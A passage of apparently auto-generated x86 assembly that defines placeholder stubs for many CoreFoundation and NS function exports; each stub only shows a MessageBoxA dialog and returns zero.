call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleFlushBundleCaches
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleFlushCaches
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleFlushCachesForURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetCFMFunctionPointerForName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetCFMFunctionPointersForNames
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetCurrentPlatform
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetExistingBundleWithBundleURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetHasChanged
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetLanguageAndRegionCodes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetLanguageSearchList
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetLocalInfoDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetMainBundleIfLooksLikeBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetPackageInfoInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetStringsFilesShared
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetSupportedPlatforms
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleGetValueForInfoKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleLayoutVersion
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleLoadExecutableAndReturnError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleMainBundleInfoDictionaryComesFromResourceFork
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleSetCFMConnectionID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleSetDefaultLocalization
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleSetStringsFilesShared
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFBundleURLLooksLikeBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCalendarAddComponentsV
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCalendarComposeAbsoluteTimeV
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCalendarDecomposeAbsoluteTimeV
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCalendarGetComponentDifferenceV
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetCreateKeyedCodingString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetGetKeyedCodingBuiltinType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetGetKeyedCodingRange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetGetKeyedCodingType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetIsInverted
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetIsMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCharacterSetSetIsInverted
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFContentsOfDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCopyExtensionForAbstractType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCopyServerVersionDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCopySystemVersionDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCreateApplicationRepositoryPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFCreateDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDataFindBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDeleteFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDictionaryFastEnumeration
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDictionaryGetKVOBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDictionaryIsMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDictionarySetCapacity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDictionarySetKVOBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFDoExceptionOperation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFErrorCreateDebugDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFErrorCreateLocalizedDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFErrorCreateLocalizedFailureReason
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFErrorCreateLocalizedRecoverySuggestion
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFExecutableLinkedOnOrAfter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFFindBundleResources
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetAlternatePlatformName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetCurrentDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetFileProperties
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetOutOfMemoryErrorCallBack
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetPathProperties
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetPlatformName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetProcessPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetProductName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetProgname
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetSlash
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetTSD
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetWindowsAppleAppDataDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetWindowsAppleSystemLibraryDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFGetWindowsBinaryDirectories
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFHyphenationGetAllPossibleHyphenationLocations
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFHyphenationGetLinguisticDataPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFHyphenationSetLinguisticDataPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFIsAbsolutePath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFIsDeallocating
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFKeyedArchiverUIDCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFKeyedArchiverUIDGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFKeyedArchiverUIDGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFLengthAfterDeletingLastPathComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFLengthAfterDeletingPathExtension
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFLocaleGetNoteCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFLogvEx
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFMainPThread
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFNotificationCenterSetRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFNumberGetType2
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesAlwaysUseVolatileUserDomains
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesCreatePathToUsersManagedPrefsDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesIsManaged
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesManagementStatusChangedForDomains
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesPostValuesChangedInDomains
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesWriteDomainDictionaryToPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPreferencesWriteManagedDomainForUser
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFProcessNameString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFProcessPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPropertyListCreateFiltered
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPropertyListCreateFromXMLData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPropertyListCreateFromXMLString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPropertyListCreateSingleValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFPropertyListCreateXMLDataWithExtras
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadBytesFromFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadBytesFromPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadBytesFromPathAndGetFD
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadStreamClearEvent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadStreamCopyRunLoopsAndModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadStreamCreateFromFileDescriptor
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadStreamGetClient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadStreamGetRunLoopsAndModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFReadStreamSignalEventDelayed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRemoveDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoop01
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopFinished
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGet0
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGet0b
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGet2
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGet2b
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGetWindowsMessageQueueHandler
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGetWindowsMessageQueueMask
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopGetWindowsThreadID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopModeContainsMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopSetWindowsMessageQueueHandler
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopSetWindowsMessageQueueMask
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRunLoopStopMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeCreateInstance
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeGetClassWithTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeInitStaticInstance
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeRegisterClass
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeSetCFMPresent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeSetInstanceTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFRuntimeUnregisterClassWithTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetFastEnumeration
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetGetKVOBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetIsMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetOutOfMemoryErrorCallBack
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetSetCapacity
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetSetKVOBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSetTSD
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFSocketStreamSetAuthenticatesServerCertificateDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStartOfLastPathComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStartOfPathExtension
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamCreateWithConstantCallbacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamInstanceSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamSetInfoPointer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamSourceScheduleWithAllRunLoops
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamSourceScheduleWithRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamSourceUncheduleFromAllRunLoops
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStreamSourceUnscheduleFromRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringAppendFormatAndArgumentsAux
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringCheckAndGetCharacterAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringCheckAndGetCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringCreateHostName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringCreateWithBytesNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringCreateWithFormatAndArgumentsAux
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringEncodingSetForceASCIICompatibility
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringGetFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringGetLength2
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringHyphenationCompileHyphenatorData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStringIsLegalURLString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFStripTrailingPathSlashes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFTimeZoneGetNoteCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFTransmutePathSlashes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFTryRetain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLAlloc
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLCopyComponents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLCopyPropertyListRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLCreateCurrentDirectoryURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLCreateFromComponents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLCreateFromPropertyListRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLGetEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLGetWideFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLInitFSPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFURLInitWithString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFWriteBytesToFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFWriteStreamCopyRunLoopsAndModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFWriteStreamCreateFromFileDescriptor
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFWriteStreamGetClient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFWriteStreamGetRunLoopsAndModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFWriteStreamSignalEventDelayed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationCenterCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationCenterIsEmpty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationGetHostCenter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationGetSuspended
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationGetTaskCenter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationPost
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationRegisterObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationRemoveObservers
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXNotificationSetSuspended
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesCopyDictionaryForApplicationPreferences
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesCopyDictionaryForNamedVolatileSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesCopyDictionaryForSourceWithBundleID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesCopyLanguageList
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesCopyVolatileSourceNames
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesGetByHostIdentifierString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesRegisterDefaultValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesRemoveNamedVolatileSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesReplaceValuesInNamedVolatileSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesReplaceValuesInSourceWithBundleID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CFXPreferencesSetUserDefaultsPointer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_CF_forwarding_prep_0
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NSMessageBuilder
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_access
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_asprintf
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_asprintf_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_chdir
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_chmod
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_flsl
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_fprintf_l
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_getcwd
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_getenv
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_index
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_lseek
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
_NS_mkdir
push 0x0
mov eax r--data
push eax
push eax
push 0x0
